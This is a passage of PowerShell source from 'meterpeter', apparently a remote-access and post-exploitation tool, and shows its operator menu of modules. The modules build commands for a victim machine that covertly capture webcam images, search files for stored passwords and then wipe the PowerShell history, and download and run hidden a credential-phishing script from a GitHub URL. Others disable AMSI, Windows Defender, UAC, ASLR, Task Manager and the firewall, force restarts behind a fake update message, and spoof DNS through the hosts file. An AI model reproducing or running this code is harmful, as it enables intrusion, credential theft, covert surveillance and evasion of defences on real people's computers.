            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
            $Command = $Null;
          }
        }
        If($Cam_choise -ieq "Manual" -or $Cam_choise -ieq "manual")
        {
          $name = "CommandCam.exe";
          $File = "$Bin$name"
          write-host " - Input Device Name to Use: " -NoNewline;
          $deviceName = Read-Host;
          If(-not($deviceName))
          {
            write-host "`n`n   [i] None Device Name enter, Aborting .." -ForegroundColor Red;Start-Sleep -Seconds 2;
          } else {
            If(([System.IO.File]::Exists("$File")))
            {
              $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
              $FileBytes = "($FileBytes)";
              $File = $File.Split('\')[-1];
              $File = $File.Split('/')[-1];
              $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";powershell -version 2 Start-Process -FilePath `$env:tmp\CommandCam.exe /devname `"$deviceName`" /quiet -WindowStyle Hidden;Start-Sleep -Seconds 3;cmd /R del /Q /F %tmp%\CommandCam.exe}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /devname `"$deviceName`" /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /devname `"$deviceName`" /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}";            
              $Command = $Command -replace "#","$File";
              $Command = $Command -replace "@","$FileBytes";
              $Camflop = "True";
              $Upload = $True;
            } Else {
              Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
              Write-Host "   ------   ---------";
              Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
              $Command = $Null;
            }
          }
        }
        If($Cam_choise -ieq "Return" -or $Cam_choise -ieq "return" -or $Cam_choise -ieq "cls" -or $Cam_choise -ieq "Modules" -or $Cam_choise -ieq "modules" -or $Cam_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $Cam_choise = $Null;
        }
      }
      If($choise -ieq "Restart")
      {
        ## Fast restart of Remote-Host (with msgbox)
        Write-Host " - RestartTime: " -NoNewline;
        $shutdown_time = Read-Host;
        If(-not ($shutdown_time) -or $shutdown_time -eq " ")
        {
          ## Default restart { - RestartTime: blank }
          Write-Host "`n`n   Status   Schedule   Message" -ForeGroundColor green;
          Write-Host "   ------   --------   -------";
          Write-Host "   restart  60 (sec)   A restart is required to finish install security updates.";
          $Command = "cmd /R shutdown /r /c `"A restart is required to finish install security updates.`" /t 60";
        }else{
          write-host " - RestartMessage: " -NoNewline;
          $shutdown_msg = Read-Host;
          If (-not ($shutdown_msg) -or $shutdown_msg -eq " ")
          {
            ## Default msgbox { - RestartMessage: blank }
            Write-Host "`n`n   Status   Schedule   Message" -ForeGroundColor green;
            Write-Host "   ------   --------   -------";
            Write-Host "   restart  $shutdown_time (sec)   A restart is required to finish install security updates.";
            $Command = "cmd /R shutdown /r /c `"A restart is required to finish install security updates.`" /t $shutdown_time";
          }else{
            ## User Inputs { - RestartTime: ++ - RestartMessage: }
            Write-Host "`n`n   Status   Schedule   Message" -ForeGroundColor green;
            Write-Host "   ------   --------   -------";
            Write-Host "   restart  $shutdown_time (sec)   $shutdown_msg";
            $Command = "cmd /R shutdown /r /c `"$shutdown_msg`" /t $shutdown_time";
          }
        }
        $shutdown_msg = $Null;
        $shutdown_time = $Null;
      }
      If($choise -ieq "Passwords" -or $choise -ieq "pass")
      {
        write-host "`n`n   Description" -ForegroundColor Yellow;
        write-host "   -----------";
        write-host "   This module allow users to search for plain text"
        write-host "   passwords stored inside local text or log files."
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Auto      Auto search recursive           Client:user  - Privileges required";
        write-host "   Manual    Input String to Search          Client:User  - Privileges required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Pass> " -NoNewline -ForeGroundColor Green;
        $pass_choise = Read-Host;
        If($pass_choise -ieq "Auto" -or $pass_choise -ieq "auto")
        {
          write-host " - Directory to search recursive (`$Env:USERPROFILE): " -NoNewLine;
          $Recursive_search = Read-Host;

          write-host " * Search for stored passwords inside text\log files." -ForegroundColor Green
          If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
          write-host "   => Warning: This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor Black;write-host "`n`n";
          $Command = "cd $Recursive_search|findstr /S /I /C:`"user`" /S /I /C:`"passw`" *.txt `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"passw`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"login`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
        }
        If($pass_choise -ieq "Manual" -or $pass_choise -ieq "manual")
        {
          write-host " - Input String to search inside files (passwrd): " -NoNewLine;
          $String_search = Read-Host;
          write-host " - Directory to search recursive (`$Env:USERPROFILE): " -NoNewLine;
          $Recursive_search = Read-Host;
          If(-not($String_search)){$String_search = "password"}
          If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
          write-host " * Search for stored passwords inside text\log files." -ForegroundColor Green
          write-host "   => Warning: This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor Black;write-host "`n`n";
          $Command = "cd $Recursive_search|findstr /s /I /C:`"$String_search`" /S /I /C:`"passw`" *.txt `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
        }
        If($pass_choise -ieq "Return" -or $pass_choise -ieq "return" -or $pass_choise -ieq "cls" -or $pass_choise -ieq "Modules" -or $pass_choise -ieq "modules" -or $pass_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $pass_choise = $Null;
        }
      }
      If($choise -ieq "GoogleX")
      {
        write-host "`n`n   Description" -ForegroundColor Yellow;
        write-host "   -----------";
        write-host "   Opens the default WebBrowser in sellected easter egg";
        write-host "   Or opens a new Tab if the browser its allready open.";
        write-host "`n`n   Modules     Description                     Remark" -ForegroundColor green;
        write-host "   -------     -----------                     ------";
        write-host "   gravity     Open Google-Gravity             Client:User  - Privileges required";
        write-host "   sphere      Open Google-Sphere              Client:user  - Privileges required";
        write-host "   rotate      Rotate webpage 360º             Client:User  - Privileges required";
        write-host "   mirror      Open Google-Mirror              Client:User  - Privileges required";
        write-host "   teapot      Open Google-teapot              Client:User  - Privileges required";
        write-host "   invaders    Open Invaders-Game              Client:User  - Privileges required";
        write-host "   pacman      Open Pacman-Game                Client:User  - Privileges required";
        write-host "   rush        Open Google-Zerg-Rush           Client:User  - Privileges required";
        write-host "   moon        Open Google-Moon                Client:User  - Privileges required";
        write-host "   kidscoding  Open Google-kidscoding          Client:User  - Privileges required";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:GoogleX> " -NoNewline -ForeGroundColor Green;
        $EasterEgg = Read-Host;
        write-host "`n";
        If($EasterEgg -ieq "kidscoding")
        {
           $cmdline = "https://www.google.com/logos/2017/logo17/logo17.html"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "teapot")
        {
           $cmdline = "https://www.google.com/teapot"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "sphere")
        {
           $cmdline = "https://mrdoob.com/projects/chromeexperiments/google-sphere"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "gravity")
        {
           $cmdline = "https://mrdoob.com/projects/chromeexperiments/google-gravity"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "rotate")
        {
           $cmdline = "https://www.google.com/search?q=do+a+barrel+roll"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "rush")
        {
           $cmdline = "https://elgoog.im/zergrush/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "moon")
        {
           $cmdline = "https://www.google.com/moon/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "mirror")
        {
           $cmdline = "https://elgoog.im/google-mirror/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "pacman")
        {
           $cmdline = "https://elgoog.im/pacman/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "invaders")
        {
           $cmdline = "https://elgoog.im/space-invaders/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }        
        If($EasterEgg -ieq "Return" -or $EasterEgg -ieq "cls" -or $EasterEgg -ieq "Modules" -or $EasterEgg -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
        }
        $EasterEgg = $Null;
      }
      If($choise -ieq "LockPC" -or $choise -ieq "lock")
      {
        write-host "`n`n   Description" -ForegroundColor Yellow;
        write-host "   -----------";
        write-host "   This module allow users to lock target pc"
        write-host "   Remark: This function silent restarts explorer." -ForeGroundColor yellow;
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   start     lock target pc                  Client:user  - Privileges required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Lock> " -NoNewline -ForeGroundColor Green;
        $Lock_choise = Read-Host;
        If($Lock_choise -ieq "start")
        {
           write-host " * Lock Remote WorkStation." -ForegroundColor Green;write-host "`n`n";
           $Command = "rundll32.exe user32.dll, LockWorkStation;echo `"   [i] Remote-Host WorkStation Locked ..`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($Lock_choise -ieq "Return" -or $Lock_choise -ieq "cls" -or $Lock_choise -ieq "Modules" -or $Lock_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $Lock_choise = $Null;
        }
      }
      If($choise -ieq "Speak")
      {
        write-host "`n`n   Description" -ForegroundColor Yellow;
        write-host "   -----------";
        write-host "   This module makes remote host speak one sentence."
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   start     speak input sentence            Client:user  - Privileges required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Speak> " -NoNewline -ForeGroundColor Green;
        $Speak_choise = Read-Host;
        If($Speak_choise -ieq "start")
        {
           write-host " - Input Frase for Remote-Host to Speak: " -NoNewline;
           $MYSpeak = Read-Host;
           write-host " * Lock Remote WorkStation." -ForegroundColor Green
           If(-not ($MYSpeak -ieq $False -or $MYSpeak -eq ""))
           {
             write-host "`n";
             $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
           }
           Else
           {
             write-host "`n";
             $MYSpeak = "Next time dont forget to input the text   ok";
             $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
           }
        }
        If($Speak_choise -ieq "Return" -or $Speak_choise -ieq "cls" -or $Speak_choise -ieq "Modules" -or $Speak_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $Speak_choise = $Null;
        }
      }
      If($choise -ieq "PhishCred" -or $choise -ieq "Creds")
      {
        write-host "`n`n   Description" -ForegroundColor Yellow;
        write-host "   -----------";
        write-host "   This module spawns a remote 'PromptForCredential' dialogBox";
        write-host "   in the hope that target user enters is credentials to leak them";
        write-host "`n`n   Modules     Description                 Remark" -ForegroundColor green;
        write-host "   -------     -----------                 ------";
        write-host "   Start       Phish for remote creds      Client:User - Privileges required";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Creds> " -NoNewline -ForeGroundColor Green;
        $cred_choise = Read-Host;
        If($cred_choise -ieq "Start")
        {
           write-host " * Phishing for remote credentials (logon)" -ForegroundColor Green;Write-Host ""
           $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CredsPhish.ps1`" -OutFile `"`$Env:TMP\CredsPhish.ps1`"|Out-Null;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\CredsPhish.ps1 -PhishCreds start`" -Wait;Get-Content -Path `"`$Env:TMP\creds.log`";Remove-Item -Path `"`$Env:TMP\creds.log`" -Force;Remove-Item -Path `"`$Env:TMP\CredsPhish.ps1`" -Force"
        }
        If($cred_choise -ieq "Return" -or $cred_choise -ieq "return" -or $cred_choise -ieq "cls" -or $cred_choise -ieq "Modules" -or $cred_choise -ieq "modules" -or $cred_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
        }
        $cred_choise = $Null;
      }
      If($choise -ieq "AMSIset" -or $choise -ieq "amsi")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Disable AMSI (regedit)          Client:User OR ADMIN - Privs Required";
        write-host "   Enable    Enable  AMSI (regedit)          Client:User OR ADMIN - Privs Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Amsi> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          ## HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender -value DisableAntiSpyware 1 (dword32) | Set-MpPreference -DisableRealtimeMonitoring $True
          write-host " * Disable Remote-Host AMSI (Client:User OR Admin)." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -value 1 -Force;echo `"   [i] Restart Remote-Host to disable Windows Defender ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name 'AmsiEnable' -value 0 -Force;Get-Item -path `"HKCU:\SOFTWARE\Microsoft\Windows Script\Settings`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " * Enable Remote-Host AMSI (Client:User OR Admin)." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-ItemProperty -path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Force;echo `"   [i] Restart Remote-Host to Enable Windows Defender ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Remove-ItemProperty -path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name 'AmsiEnable' -Force;Get-Item -path `"HKCU:\SOFTWARE\Microsoft\Windows Script\Settings`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
          $Command = $Null;
          $choise_two = $Null;
        }
        $choise_two = $Null;
      }
      If($choise -ieq "UACSet" -or $choise -ieq "uac")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Disable Remote UAC              Client:Admin - Privileges Required";
        write-host "   Enable    Enable Remote UAC               Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Uac> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " * Turn OFF Remote-Host UAC .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0 -Force;Get-ItemProperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' | select-Object EnableLUA,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " * Turn ON Remote-Host UAC .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 1 -Force;Get-ItemProperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' | select-Object EnableLUA,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
          $Command = $Null;
          $choise_two = $Null;
        }
        $choise_two = $Null;
      }
      If($choise -ieq "ASLRSet" -or $choise -ieq "aslr")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Disable ASLR (regedit)          Client:ADMIN - Privileges Required";
        write-host "   Enable    Enable  ASLR (regedit)          Client:ADMIN - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Aslr> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " * Disable Remote-Host ASLR (Windows Defender)." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'MoveImages' -value 0 -Force;echo `"   [i] Restart Remote-Host to disable Windows Defender ASLR ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " * Enable Remote-Host ASLR (Windows Defender)." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'MoveImages' -value 1 -Force;echo `"   [i] Restart Remote-Host to Enable Windows Defender ASLR ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
        $Command = $Null;
        $choise_two = $Null;
        }
      }      
      If($choise -ieq "TaskMan" -or $choise -ieq "task")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Disable Remote TaskManager      Client:Admin - Privileges Required";
        write-host "   Enable    Enable Remote TaskManager       Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Task> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " * Turn OFF Remote-Host Task Manager .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 /f;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' | select-Object DisableTaskMgr,PSchildName,PSDrive,PSProvider `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " * Turn ON Remote-Host Task Manager .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' | select-Object DisableTaskMgr,PSchildName,PSDrive,PSProvider `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear")
        {
        $choise = $Null;
        $Command = $Null;
        }
      }
      If($choise -ieq "Firewall")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Check     Review Firewall Settings        Client:User  - Privileges Required";
        write-host "   Disable   Disable Remote Firewall         Client:Admin - Privileges Required";
        write-host "   Enable    Enable Remote Firewall          Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Firewall> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Check" -or $choise_two -ieq "check")
        {
          write-host " * Review Remote Firewall Settings (allprofiles)." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R netsh advfirewall show allprofiles `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve firewall settings ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " * Disable Remote-Host Firewall (allprofiles)." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R netsh advfirewall set allprofiles state off;echo `"   [i] Remote Firewall Disable (allprofile) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " * Enable Remote-Host Firewall (allprofiles)." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R netsh advfirewall set allprofiles state on;echo `"   [i] Remote Firewall Enabled (allprofile) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
          $Command = $Null;
          $choise_two = $Null;
        }
        $choise_two = $Null;
      }
      If($choise -ieq "Dnspoof" -or $choise -ieq "dns")
      {
        write-host "`n`n   Warnning" -ForegroundColor Yellow;
        write-host "   --------";
        write-host "   The First time 'Spoof' module its used, it will backup";
        write-host "   the real hosts file (hosts-backup) there for its importante";
        write-host "   to allways 'Default' the hosts file before using 'Spoof' again.";
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Check     Review hosts File               Client:User  - Privileges Required";
        write-host "   Spoof     Add Entrys to hosts             Client:Admin - Privileges Required";
        write-host "   Default   Defaults the hosts File         Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Dns> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Check" -or $choise_two -ieq "check")
        {
          write-host " * Review hosts File Settings .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "Get-Content `$env:windir\System32\drivers\etc\hosts `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve: $Remote_Host hosts file ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Spoof" -or $choise_two -ieq "spoof")
        {
          write-host " - IpAddr to Redirect: " -NoNewline;
          $Ip_spoof = Read-Host;
          write-host " - Domain to be Redirected: " -NoNewline;
          $Domain_spoof = Read-Host;
          If(-not($Ip_spoof)){$Ip_spoof = "$localIpAddress"}
          If(-not($Domain_spoof)){$Domain_spoof = "www.google.com"}
          ## Copy-Item -Path '$env:windir\system32\Drivers\etc\hosts' -Destination '%SYSTEMROOT%\system32\Drivers\etc\hosts-backup' -Force
          write-host " * Redirecting Domains Using hosts File (Dns Spoofing)." -ForegroundColor Green
          write-host "   => Redirect Domain: $Domain_spoof TO IPADDR: $Ip_spoof" -ForegroundColor yellow;Start-Sleep -Seconds 1;write-host "`n`n";
